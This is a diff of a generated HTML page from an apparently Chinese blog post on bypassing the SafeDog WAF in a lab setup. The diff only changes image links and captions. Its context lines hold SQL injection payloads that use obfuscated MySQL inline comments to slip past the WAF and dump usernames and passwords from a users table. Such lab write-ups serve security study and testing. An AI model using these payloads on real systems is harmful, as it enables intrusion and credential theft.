@@ -692,7 +692,7 @@ phpstudy">
 <h3 id="0x1环境准备"><a href="#0x1环境准备" class="headerlink" title="0x1环境准备"></a>0x1环境准备</h3><p>win7  </p>
 <p>WAF：安全狗4.0  0.30255</p>
 <p>phpstudy2017</p>
-<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/clipboard.png" alt="img"></p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%AE%89%E5%85%A8%E7%8B%97.png" alt="安全狗"></p>
 <h3 id="0x2基础知识理解"><a href="#0x2基础知识理解" class="headerlink" title="0x2基础知识理解"></a>0x2基础知识理解</h3><p>1.一般绕过安全狗很多都是注释符号去绕过，然而但是/**/最简单的方式是不行，但是可以在里面加一些垃圾字符可以绕过，也是需要去FUZZ测试，因为安全狗也会对里面的内容做了过滤</p>
 <p>2.内联注释 /<em>!</em>/，在mysql里面内联注释有一个特性，如果里面的内容超出了当前的mysql版本就会报错，没有超出就不会报错</p>
 <p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002174138478.png" alt="image-20211002174138478"></p>
@@ -794,8 +794,8 @@ from/*/%-//*/information_schema./*/%-//*/schemata 拦截<span aria-hidden="true"
 <h3 id="9-查数据"><a href="#9-查数据" class="headerlink" title="9.查数据"></a>9.查数据</h3><pre><code>-1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  users --+
 -1' union /*/%-//*/ /*!12345%23%0aselect/*!1,2,*/ group_concat(concat_ws(0x7e,username,password)) /*!from*/  security.users --+
 </code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211002185644382.png" alt="image-20211002185644382"></p>
-<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/src=http%20_dik.img.kttpdq.com_pic_2_1155_d791230087f76fe5_1440x900.jpg&amp;refer=http%20_dik.img.kttpdq.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg.jpg" alt="src=http _dik.img.kttpdq.com_pic_2_1155_d791230087f76fe5_1440x900.jpg&amp;refer=http _dik.img.kttpdq.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg"></p>
-<p>参考链接：</p>
+<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E5%A5%A5%E5%8A%9B%E7%BB%99.jpg" alt="奥力给"></p>
+<p>参考链接</p>
 <p><a href="https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/AyZh3RdgZ-nWzlgdnQXJzg</a></p>
 <p><a href="https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/kpSMDm4qrV6ZvdJ1k_0q0A</a></p>
 <p><a href="https://www.cnblogs.com/Cl0ud/default.html?page=1" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/default.html?page=1</a></p>
